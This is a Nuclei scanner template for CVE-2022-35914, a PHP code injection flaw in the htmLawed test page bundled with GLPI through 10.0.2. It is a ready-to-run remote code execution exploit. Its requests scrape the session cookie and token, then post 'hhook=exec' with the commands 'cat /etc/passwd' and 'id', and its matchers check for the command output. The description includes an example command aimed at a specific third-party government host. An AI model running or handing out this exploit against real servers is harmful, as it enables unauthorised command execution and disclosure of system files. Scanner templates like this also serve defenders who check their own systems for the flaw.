id: CVE-2022-35914_51pwn

info:
  name: /vendor/htmlawed/htmlawed/htmLawedTest.php in the htmlawed module for GLPI through 10.0.2 allows PHP code injection.
  author: 51pwn
  severity: critical
  description: |
    /vendor/htmlawed/htmlawed/htmLawedTest.php in the htmlawed module for GLPI through 10.0.2 allows PHP code injection.
    测试：
    nuclei -duc -t 51pwn/CVE-2022-35914.yaml -u https://glpi-ubuntu.inti.gob.ar/vendor/htmlawed/htmlawed/htmLawedTest.php
    
  reference:
    - http://www.bioinformatics.org/phplabware/sourceer/sourceer.php?&Sfs=htmLawedTest.php&Sl=.%2Finternal_utilities%2FhtmLawed
    - https://github.com/glpi-project/glpi/releases
    - https://glpi-project.org/fr/glpi-10-0-3-disponible/
  tags: cve2022,RCE,zcs

requests:
  - raw:
      - |
        GET /vendor/htmlawed/htmlawed/htmLawedTest.php/vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
       
      - |
        POST /vendor/htmlawed/htmlawed/htmLawedTest.php/vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Cookie: {{cookie}}
        Content-Length: 88
        Content-Type: application/x-www-form-urlencoded

        token={{token}}&text=cat /etc/passwd&hhook=exec&{{cookie}}
      - |
        POST /vendor/htmlawed/htmlawed/htmLawedTest.php/vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Cookie: {{cookie}}
        Content-Length: 88
        Content-Type: application/x-www-form-urlencoded

        token={{token}}&text=id&hhook=exec&{{cookie}}
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - uid=\d+\([^\)]+\).*gid=\d+\([^\)]+\).*group
          - root:x:0:0:root
        condition: or
      - type: status
        status:
          - 200
        condition: and
    extractors:
      - type: regex
        part: header
        name: cookie
        group: 1
        internal: true
        regex:
          - '(sid=[^;]+)'
      - type: regex
        part: body
        name: token
        group: 1
        internal: true
        regex:
          - 'id="token" value="([^"]+)'